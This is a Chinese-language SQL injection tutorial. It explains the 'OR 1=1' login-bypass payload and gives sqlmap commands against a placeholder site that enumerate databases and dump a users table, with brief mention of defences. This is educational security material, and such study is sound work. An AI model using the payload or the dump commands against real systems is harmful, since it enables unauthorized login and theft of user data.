## SQL注入基础：OR与1=1的利用逻辑

#### 布尔运算符对比

| 运算符       | 逻辑              | 从注入中的用途                  |
| --------- | --------------- | ------------------------ |
| **`AND`** | 所有条件都必须为真       | 用于“追加”额外条件，常用于联合查询       |
| **`OR`**  | 只要有一个条件为真，整体即为真 | **用于让整个查询一定成立**（常用在登录绕过） |

**经典的登录绕过Payload**

```text
Username: John
Password: abc' OR 1=1;-- -
```

最后拼接到数据的SQL语句为：

```sql
SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
```
#### 执行逻辑分解


|         条件          |    结果     |
| :-----------------: | :-------: |
| `username = 'John'` | 可能为假（无所谓） |
| `password = 'abc'`  |   一定为假    |
|        `1=1`        | **永远为真**  |
由于 **`OR 1=1`** 的存在，整个条件结果被强制为真，登录验证被成功绕过。

####  `1=1` 为什么总是成立？

`1=1` 是一个**恒真表达式**，在 SQL 中永远返回 `True`。它与具体的表或字段内容无关，是 SQL 注入中最常用的“恒真条件”。

#### `OR` 运算符的关键作用

`OR` 的“只要一侧为真即可”特性，使得攻击者可以在不知道合法密码的情况下，通过附加一个恒真条件来使整个查询无条件成功，从而绕过认证逻辑。防御这类注入，需要从源头控制：**输入验证、参数化查询、最小权限原则**。

### 自动化SQL注入工具：sqlmap

`sqlmap` 是一个开源的自动化工具，用于检测和利用 SQL 注入漏洞。它支持多种数据库（如 MySQL、Oracle、MSSQL）和多种注入技术。

#### 核心功能概览

| 功能              | 相关参数                     | 说明                   |
| --------------- | ------------------------ | -------------------- |
| **检测注入点**       | `-u` (GET) 或 `-r` (POST) | 自动检测参数是否存在注入漏洞       |
| **枚举数据库**       | --dbs                    | 列出目标数据库服务器上的所有数据库名   |
| **枚举数据表**       | -D <库名> --tables         | 列出指定数据库中的所有表名        |
| **导出表数据**       | -D <库名> -T <表名> --dump   | 导出指定表的所有记录           |
| **带 Cookie 测试** | --cookie="..."           | 在需要认证的请求中携带会话 Cookie |
#### 常用命令示例

```bash
# 1. 检测注入点 (GET请求)
sqlmap -u "http://example.com/page?id=1"

# 2. 携带Cookie进行测试
sqlmap -u "http://example.com/page?id=1" --cookie="PHPSESSID=abc123"

# 3. 枚举所有数据库
sqlmap -u "http://example.com/page?id=1" --dbs

# 4. 枚举指定数据库中的所有表
sqlmap -u "http://example.com/page?id=1" -D members --tables

# 5. 导出指定表的所有数据
sqlmap -u "http://example.com/page?id=1" -D members -T users --dump

# 6. 测试POST请求 (从文件加载)
sqlmap -r intercepted_request.txt
```


#### 注入类型速查

`sqlmap` 能够识别并利用多种 SQL 注入漏洞，主要包括：


| 注入类型                           | 说明                            |
| ------------------------------ | ----------------------------- |
| **布尔盲注 (Boolean-based blind)** | 通过页面返回内容的真/假差异来推断数据           |
| **报错注入 (Error-based)**         | 利用数据库返回的错误信息直接获取数据            |
| **时间盲注 (Time-based blind)**    | 通过数据库的延时响应来推断数据               |
| **联合查询注入 (UNION query)**       | 通过 `UNION` 关键字将攻击者的查询结果合并到页面中 |
| **堆叠查询注入 (Stacked queries)**   | 支持执行多条 SQL 语句，风险更高            |
